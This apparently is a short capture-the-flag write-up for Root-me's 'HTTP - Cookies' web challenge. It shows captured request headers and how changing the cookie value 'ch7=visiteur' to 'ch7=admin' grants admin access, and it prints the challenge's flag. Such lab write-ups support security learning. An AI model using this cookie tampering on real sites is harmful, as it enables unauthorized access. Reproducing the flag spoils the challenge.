@@ -1,0 +1,52 @@
+Video Solution: https://youtu.be/AnDgcIYjWLs
+Task on Root-me: https://www.root-me.org/en/Challenges/Web-Server/HTTP-cookies
+
+http://challenge01.root-me.org/web-serveur/ch7/
+
+PS : Bob really love cookies
+	
+fill out the email form with any email example: test@test.com
+then try tamper with addon mozilla tamper the result data is
+
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+Referer=http://challenge01.root-me.org/web-serveur/ch7/
+Cookie=ch7=visiteur
+Connection=keep-alive
+Upgrade-Insecure-Requests=1
+Content-Type=application/x-www-form-urlencoded
+Content-Length=32
+POSTDATA=mail=test%40test.com&jsep4b=send
+	
+on request there is a hint "Bob really love cookies"
+pay attention to cookies at data temperatures
+
+"Cookie-ch7=visiteur"
+	
+visiteur in france if translated in english visitor
+which means a cookie as a visitor where if we change to admin with temp data
+The result is as below
+
+Host=challenge01.root-me.org
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+Referer=http://challenge01.root-me.org/web-serveur/ch7/
+Cookie=ch7=admin
+Connection=keep-alive
+Upgrade-Insecure-Requests=1
+Content-Type=application/x-www-form-urlencoded
+Content-Length=32
+POSTDATA=mail=test%40test.com&jsep4b=send
+	
+note the change Cookie = ch7 = admin
+and automatically get flags
+
+Validation password : ml-SYMPA
+
+Email saved
+	
+Flag : ml-SYMPA
